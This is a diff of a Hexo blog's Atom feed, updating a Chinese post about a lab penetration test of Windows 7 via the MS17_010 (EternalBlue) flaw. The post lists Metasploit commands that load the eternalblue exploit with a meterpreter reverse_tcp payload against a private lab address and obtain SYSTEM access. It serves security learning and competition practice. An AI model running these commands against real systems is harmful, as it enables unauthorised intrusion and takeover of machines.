@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-06T03:43:04.502Z</updated>
+  <updated>2019-12-06T04:23:45.647Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,23 +17,23 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>Metasploit渗透</title>
-    <link href="http://yoursite.com/2019/12/06/Metasploit%E6%B8%97%E9%80%8F/"/>
-    <id>http://yoursite.com/2019/12/06/Metasploit%E6%B8%97%E9%80%8F/</id>
+    <title>MS17_010渗透</title>
+    <link href="http://yoursite.com/2019/12/06/MS17_010%E6%B8%97%E9%80%8F/"/>
+    <id>http://yoursite.com/2019/12/06/MS17_010%E6%B8%97%E9%80%8F/</id>
     <published>2019-12-06T02:14:36.000Z</published>
-    <updated>2019-12-06T03:43:04.502Z</updated>
+    <updated>2019-12-06T04:23:45.647Z</updated>
     
-    <content type="html"><![CDATA[<hr><p>Windows渗透：</p><p>MS08_067，MS17_010，CVE-2017-7269，MS14_064，双脉冲星漏洞</p><p>这几个漏洞是在比赛中常用的，MS08_067最好是放在最后用，如果渗透失败需要重启靶机</p><p>通过MS17_010学习msf对渗透的利用：</p><p>​    靶机：Windows 7 （192.168.157.135）</p><p>​    攻击机：Kali （192.168.157.132）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞</p><p><img src="https://img.vim-cn.com/db/e190eb3c34d3688891f1a9a23ee3749d404023.png" alt="0"></p><p>2.输入msfconsole进入搜索MS17_010可利用漏洞模块</p><p><img src="https://img.vim-cn.com/b0/9e43fdcbbc88bf3211ce12ea5cc1bc9004bda1.png" alt="1"></p><p>3.利用漏洞模块，设置参数</p><p>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</p><p>msf5 &gt; set RHOSTS 192.168.157.135</p><p>msf5 &gt; set payload windows/x64/meterpreter/reverse_tcp</p><p>msf5 &gt; set LHOST 192.168.157.132</p><p>msf5 &gt; exploit</p><p><img src="https://s2.ax1x.com/2019/12/06/QJQ19H.png" alt="3"></p><p>可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了</p>]]></content>
+    <content type="html"><![CDATA[<hr><p>通过MS17_010学习msf对渗透的利用：</p><p>​    靶机：Windows 7 （192.168.157.135）</p><p>​    攻击机：Kali （192.168.157.132）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞</p><p><img src="https://img.vim-cn.com/db/e190eb3c34d3688891f1a9a23ee3749d404023.png" alt="0"></p><p>2.输入msfconsole进入搜索MS17_010可利用漏洞模块</p><p><img src="https://img.vim-cn.com/b0/9e43fdcbbc88bf3211ce12ea5cc1bc9004bda1.png" alt="1"></p><p>3.利用漏洞模块，设置参数</p><p>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</p><p>msf5 &gt; set RHOSTS 192.168.157.135</p><p>msf5 &gt; set payload windows/x64/meterpreter/reverse_tcp</p><p>msf5 &gt; set LHOST 192.168.157.132</p><p>msf5 &gt; exploit</p><p><img src="https://s2.ax1x.com/2019/12/06/QJQ19H.png" alt="3"></p><p>可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了</p>]]></content>
     
     <summary type="html">
     
       
       
         &lt;hr&gt;
-&lt;p&gt;Windows渗透：&lt;/p&gt;
-&lt;p&gt;MS08_067，MS17_010，CVE-2017-7269，MS14_064，双脉冲星漏洞&lt;/p&gt;
-&lt;p&gt;这几个漏洞是在比赛中常用的，MS08_067最好是放在最后用，如果渗透失败需要重启靶机&lt;/p&gt;
-&lt;p&gt;通过MS17_0
+&lt;p&gt;通过MS17_010学习msf对渗透的利用：&lt;/p&gt;
+&lt;p&gt;​    靶机：Windows 7 （192.168.157.135）&lt;/p&gt;
+&lt;p&gt;​    攻击机：Kali （192.168.157.132）&lt;/p&gt;
+&lt;p&gt;1.使用-p-对靶机进行扫描，查看有哪些
       
     
     </summary>
